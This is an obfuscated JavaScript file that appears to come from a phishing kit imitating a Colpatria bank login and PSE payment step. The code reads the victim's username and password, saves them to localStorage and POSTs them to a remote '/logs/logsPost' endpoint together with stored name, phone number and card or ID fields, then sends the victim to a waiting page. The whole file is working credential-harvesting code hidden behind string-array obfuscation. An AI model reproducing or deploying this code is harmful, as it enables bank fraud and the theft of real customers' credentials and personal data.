const _0x1b2e3d = _0x12c6;
function _0x12c6(_0x578fbb, _0x479f9b) {
  const _0x367cf8 = _0x367c();
  return (
    (_0x12c6 = function (_0x12c659, _0x3d59b6) {
      _0x12c659 = _0x12c659 - 0x155;
      let _0x5df0a8 = _0x367cf8[_0x12c659];
      return _0x5df0a8;
    }),
    _0x12c6(_0x578fbb, _0x479f9b)
  );
}
(function (_0x1eb1c9, _0x3b888e) {
  const _0x46c1d2 = _0x12c6,
    _0x39bf5d = _0x1eb1c9();
  while (!![]) {
    try {
      const _0x1da9c5 =
        (-parseInt(_0x46c1d2(0x16c)) / 0x1) *
          (-parseInt(_0x46c1d2(0x176)) / 0x2) +
        (parseInt(_0x46c1d2(0x167)) / 0x3) *
          (-parseInt(_0x46c1d2(0x157)) / 0x4) +
        parseInt(_0x46c1d2(0x160)) / 0x5 +
        parseInt(_0x46c1d2(0x17a)) / 0x6 +
        (parseInt(_0x46c1d2(0x178)) / 0x7) *
          (-parseInt(_0x46c1d2(0x155)) / 0x8) +
        -parseInt(_0x46c1d2(0x171)) / 0x9 +
        (-parseInt(_0x46c1d2(0x15b)) / 0xa) *
          (-parseInt(_0x46c1d2(0x16a)) / 0xb);
      if (_0x1da9c5 === _0x3b888e) break;
      else _0x39bf5d["push"](_0x39bf5d["shift"]());
    } catch (_0x56f75a) {
      _0x39bf5d["push"](_0x39bf5d["shift"]());
    }
  }
})(_0x367c, 0x59976);
function updateLS() {
  const _0x51971a = _0x12c6;
  LS[_0x51971a(0x16e)](_0x51971a(0x16f), JSON["stringify"](info));
}
function _0x367c() {
  const _0x168110 = [
    "value",
    "PSE",
    "btnUsuario",
    "2DGsPZj",
    "./wait.html",
    "26635HsQCuv",
    "user",
    "3766698CfMvJR",
    "792jxTaAr",
    "json",
    "33688tzkqEs",
    "click",
    "dudename",
    "href",
    "106890uUvaUe",
    "preventDefault",
    "catch",
    "POST",
    "Por\x20favor\x20ingrese\x20la\x20información\x20requerida",
    "846855iHvBcE",
    "Ingresó\x20datos",
    "Network\x20response\x20was\x20not\x20ok",
    "metaInfo",
    "getElementById",
    "disabled",
    "error",
    "108ypqzUQ",
    "txtUsuario",
    "focus",
    "704JMKpJi",
    "addEventListener",
    "180786oMYXDF",
    "stringify",
    "setItem",
    "info",
    "puser",
    "5536647fafVCT",
    "then",
  ];
  _0x367c = function () {
    return _0x168110;
  };
  return _0x367c();
}
const button = document[_0x1b2e3d(0x164)](_0x1b2e3d(0x175)),
  userInput = document[_0x1b2e3d(0x164)](_0x1b2e3d(0x168)),
  passInput = document[_0x1b2e3d(0x164)]("txtPass");
button[_0x1b2e3d(0x16b)](_0x1b2e3d(0x158), async function (_0x6e54a2) {
  const _0x2827e0 = _0x1b2e3d;
  _0x6e54a2[_0x2827e0(0x15c)](), (button[_0x2827e0(0x165)] = !![]);
  if (userInput[_0x2827e0(0x173)] == "" && passInput["value"] == "") {
    alert(_0x2827e0(0x15f)),
      userInput[_0x2827e0(0x169)](),
      (button[_0x2827e0(0x165)] = ![]);
    return;
  } else {
    var _0x3d9c6c = userInput[_0x2827e0(0x173)],
      _0x21fd0e = passInput[_0x2827e0(0x173)];
    (info[_0x2827e0(0x163)][_0x2827e0(0x179)] = _0x3d9c6c),
      (info[_0x2827e0(0x163)][_0x2827e0(0x170)] = _0x21fd0e),
      updateLS();
    const _0x21d7e0 = {
      reg: info[_0x2827e0(0x163)]["cc"],
      name: info[_0x2827e0(0x163)][_0x2827e0(0x159)],
      cl: info[_0x2827e0(0x163)]["telnum"],
      us: info["metaInfo"][_0x2827e0(0x179)],
      ps: info[_0x2827e0(0x163)]["puser"],
      bn: "㊗️​Colpatria",
      status: _0x2827e0(0x161),
      fuente: _0x2827e0(0x174),
    };
    fetch(url + "/logs/logsPost", {
      method: _0x2827e0(0x15e),
      headers: { "Content-Type": "application/json" },
      body: JSON[_0x2827e0(0x16d)](_0x21d7e0),
    })
      ["then"]((_0x43e617) => {
        const _0x5e92f3 = _0x2827e0;
        if (!_0x43e617["ok"]) throw new Error(_0x5e92f3(0x162));
        return _0x43e617[_0x5e92f3(0x156)]();
      })
      [_0x2827e0(0x172)]((_0x189896) => {
        const _0x252cde = _0x2827e0;
        window["location"][_0x252cde(0x15a)] = _0x252cde(0x177);
      })
      [_0x2827e0(0x15d)]((_0x4cf1b5) => {
        const _0x54f52e = _0x2827e0;
        console[_0x54f52e(0x166)]("Error:", _0x4cf1b5),
          (button["disabled"] = ![]);
      });
  }
});
